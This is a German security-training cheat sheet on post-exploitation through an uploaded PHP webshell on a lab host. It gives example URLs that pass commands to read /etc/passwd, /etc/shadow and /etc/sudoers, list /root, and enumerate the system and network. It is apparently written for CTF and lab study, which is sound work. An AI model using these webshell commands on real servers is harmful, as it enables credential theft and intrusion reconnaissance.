# 🐚 PHP Webshell – Usage & Enumeration Guide

## 📘 Kontext

Diese Datei dokumentiert typische **Post-Exploitation-Kommandos**, die nach erfolgreicher Platzierung einer PHP-Webshell (`cmdshell.php3`) ([mehr zu cmdshell.php3](/vulnerabilities/sqlInjection/cmdshellAndHowToUse/phpRCE_CheatSheet.md)) auf einem Zielsystem ausgeführt werden können.  
Der Zugriff erfolgt über einen GET-Parameter `cmd`, der Systembefehle auf dem Server ausführt.

> ⚠️ Hinweis: Diese Vorgehensweise dient ausschließlich Schulungs- und Testzwecken innerhalb legaler Testumgebungen oder CTF-Szenarien.

---

## 🔗 Beispielhafte Webshell-Aufrufe

Die folgenden URLs zeigen den Zugriff auf die Webshell:

```bash
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=[COMMAND]
```

**Beispielhafte Kommandos:**
```bash
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/passwd
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/shadow
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/group
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/group | grep admin
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=cat /etc/sudoers
```
**Dateisystem & Benutzerverzeichnisse durchsuchen:**
```bash
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /var/www
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /home
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=ls -la /root
http://192.168.1.51/admin/uploads/cmdshell.php3?cmd=id
```

---

## 🧾 Systeminformationen ermitteln

```bash
uname -a        # vollständige Systeminformationen
uname -s        # Kernel-Name
uname -n        # Netzwerkname des Hosts
uname -r        # Kernel-Version
uname -v        # Kernel-Build
uname -m        # Architektur (z. B. x86_64)
uname -p        # Prozessor
uname -i        # Hardware-Plattform

pwd             # aktuelles Verzeichnis
whoami          # aktueller Benutzer
```

---

## 🌐 Netzwerküberblick

### Netstat-Befehle zur Analyse aktiver Verbindungen:

```bash
netstat         # allgemeine Übersicht
netstat -a      # alle Verbindungen und Ports
netstat -at     # nur TCP
netstat -au     # nur UDP
netstat -l      # nur "listening" Ports
netstat -lp     # mit Prozessinfos (sofern verfügbar)
```

---

## 🧪 Typische Ziele nach Webshell-Zugriff

| Ziel            | Zielsetzung                     |
| --------------- | ------------------------------- |
| `/etc/passwd`   | Benutzerkonten einsehen         |
| `/etc/shadow`   | Passwort-Hashes (nur als root)  |
| `/etc/group`    | Gruppenzugehörigkeiten          |
| `/etc/sudoers`  | Sudo-Rechte prüfen              |
| `/var/www/`     | Web-Inhalte durchsuchen         |
| `/home/`        | Benutzerverzeichnisse einsehen  |
| `/root/`        | Admin-Account analysieren       |
| `id`, `whoami`  | User-Kontext prüfen             |
| `netstat`, `ss` | Netzwerkservices identifizieren |
| `uname -a`      | Systemplattform identifizieren  |

---

## ⚠️ Haftungsausschluss

Dieses Repository dient ausschließlich zu Ausbildungs-, Forschungs- und Demonstrationszwecken im Bereich der IT-Sicherheit.

Alle hier dokumentierten Techniken und Tools dürfen nur in legalen und autorisierten Testumgebungen verwendet werden – z. B. in Labors, CTFs oder mit ausdrücklicher Genehmigung des Eigentümers der Zielsysteme.

Wir distanzieren uns ausdrücklich von jeglicher illegalen Nutzung.
Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und Auszubildende, die ethisch und rechtlich korrekt handeln.

--- 

Stay curious – stay secure. 🔐

🗓️ **Letzte Aktualisierung:** Juli 2025  
🤝 **Pull Requests willkommen** – Vorschläge für neue Kurse oder Kategorien gerne einreichen!

---

## 🔗 Siehe auch
- [phpRCE_CheatSheet.md](/vulnerabilities/sqlInjection/cmdshellAndHowToUse/phpRCE_CheatSheet.md)
- [sqlInjectionToShell.md](/vulnerabilities/sqlInjection/SQLInjectionToShell.md)
- [postExploitationTools.md](/vulnerabilities/postExploitationTools.md)